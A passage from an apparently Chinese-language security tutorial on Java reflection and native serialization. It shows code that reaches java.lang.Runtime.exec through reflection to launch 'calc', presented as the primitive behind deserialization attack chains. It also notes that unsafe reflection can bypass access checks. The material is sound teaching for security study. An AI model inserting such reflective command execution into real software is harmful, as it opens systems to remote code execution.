</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">users</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//4.对成员方法进行执行</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 创建 User 对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">User</span><span class="w"> </span><span class="n">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">User</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 获取名为 &#34;users&#34; 的方法，该方法接受两个参数（String 和 String）</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">users1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;users&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 使用反射调用 User 对象的 users 方法，传递参数 &#34;xiaodigay&#34; 和 &#34;gay1&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">users1</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">u</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;xiaodigay&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;gay1&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h2 id="不安全命令执行反序列化链构造">不安全命令执行&amp;反序列化链构造<a hidden class="anchor" aria-hidden="true" href="#不安全命令执行反序列化链构造">#</a></h2>
<h3 id="1反射实现-命令执行">1、反射实现-命令执行<a hidden class="anchor" aria-hidden="true" href="#1反射实现-命令执行">#</a></h3>
<p>原型：java自带包含有的java.lang中有对于本机控制台的调用方法</p>
<div class="code-block-container" id="code-1769750397353901900" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397353901900">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397353901900" title="Toggle" aria-expanded="false" aria-controls="code-1769750397353901900" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397353901900-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span><span class="lnt" id="40"><span class="lnlinks">40</span>
</span><span class="lnt" id="41"><span class="lnlinks">41</span>
</span><span class="lnt" id="42"><span class="lnlinks">42</span>
</span><span class="lnt" id="43"><span class="lnlinks">43</span>
</span><span class="lnt" id="44"><span class="lnlinks">44</span>
</span><span class="lnt" id="45"><span class="lnlinks">45</span>
</span><span class="lnt" id="46"><span class="lnlinks">46</span>
</span><span class="lnt" id="47"><span class="lnlinks">47</span>
</span><span class="lnt" id="48"><span class="lnlinks">48</span>
</span><span class="lnt" id="49"><span class="lnlinks">49</span>
</span><span class="lnt" id="50"><span class="lnlinks">50</span>
</span><span class="lnt" id="51"><span class="lnlinks">51</span>
</span><span class="lnt" id="52"><span class="lnlinks">52</span>
</span><span class="lnt" id="53"><span class="lnlinks">53</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//GetRunExec.java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.reflectdemo1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">jdk.jfr.consumer.RecordedFrame</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationTargetException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">GetRunExec</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchMethodException</span><span class="p">,</span><span class="w"> </span><span class="n">InvocationTargetException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">InstantiationException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//原生调用</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//第三方jar</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 使用 Class.forName 获取 java.lang.Runtime 类</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 获取 Runtime 类的所有公共方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="o">[]</span><span class="w"> </span><span class="n">methods</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getMethods</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 遍历所有方法并打印输出方法信息</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Method</span><span class="w"> </span><span class="n">me</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">methods</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">me</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//获取单个Runtime</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">getRuntime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getRuntime&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">getRuntime</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 获取名为 &#34;exec&#34; 的方法，该方法接受一个 String 参数</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 获取名为 &#34;getRuntime&#34; 的方法，该方法不接受参数</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">getRuntimeMethod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getRuntime&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 使用反射调用 aClass 对象的 getRuntime 方法，获取 Runtime 对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">runtime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getRuntimeMethod</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">aClass</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 使用反射调用 Runtime 对象的 exec 方法，执行系统命令 &#34;calc.exe&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">exec</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">runtime</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;calc.exe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        
</span></span></span><span class="line"><span class="cl"><span class="w">        
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 使用 Class.forName 获取 Runtime 类</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">c1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 获取 Runtime 类的默认构造方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c1</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 设置构造方法为可访问</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">m</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 使用反射调用 Runtime 类的 exec 方法，执行系统命令 &#34;calc&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">c1</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(),</span><span class="w"> </span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h3 id="2不安全的反射对象">2、不安全的反射对象<a hidden class="anchor" aria-hidden="true" href="#2不安全的反射对象">#</a></h3>
<p>指应用程序使用具有反射功能的外部输入来选择要使用的类或代码，<br>
可能被攻击者利用而输入或选择不正确的类。绕过身份验证或访问控制检查<br>
参考分析：</p>
<h1 id="35-原生反序列化">35-原生反序列化<a hidden class="anchor" aria-hidden="true" href="#35-原生反序列化">#</a></h1>
<h2 id="java序列化反序列化">Java序列化&amp;反序列化<a hidden class="anchor" aria-hidden="true" href="#java序列化反序列化">#</a></h2>
<p>参考资料：</p>
<p>1、序列化与反序列化<br>
序列化：将内存中的对象压缩成字节流<br>
反序列化：将字节流转化成内存中的对象</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902779.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902477.png" style="max-width: 100%; height: auto;"></p>
<p>2、为什么有序列化技术<br>
序列化与反序列化的设计就是用来<strong>传输数据</strong>的。</p>
<p>应用场景<br>
(1) 想把内存中的对象保存到一个文件中或者是数据库当中。<br>
(2) 用套接字在网络上传输对象。<br>
(3) 通过RMI传输对象的时候。</p>
<h2 id="原生序列化反序列化">原生序列化&amp;反序列化<a hidden class="anchor" aria-hidden="true" href="#原生序列化反序列化">#</a></h2>
<div class="code-block-container" id="code-1769750397358182500" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397358182500">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397358182500" title="Toggle" aria-expanded="false" aria-controls="code-1769750397358182500" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397358182500-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//UserDemo.java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.seriatestdemo</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.Serializable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">UserDemo</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Serializable</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">serialVersionUID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">5306964442453291483L</span><span class="p">;</span><span class="w"> </span><span class="c1">// 显式定义 serialVersionUID</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;xiaodi&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">gender</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;man&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="n">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">18</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">UserDemo</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">gender</span><span class="p">,</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="n">age</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">gender</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gender</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;UserDemo_&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;UserDemo_&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">gender</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;UserDemo_&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">age</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">toString</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;User{&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;name=&#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="sc">&#39;\&#39;&#39;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;, gender=&#39;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">gender</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="sc">&#39;\&#39;&#39;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;, age=&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">age</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="sc">&#39;}&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><div class="code-block-container" id="code-1769750397360872900" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397360872900">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397360872900" title="Toggle" aria-expanded="false" aria-controls="code-1769750397360872900" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397360872900-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//SerializableDemo.java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
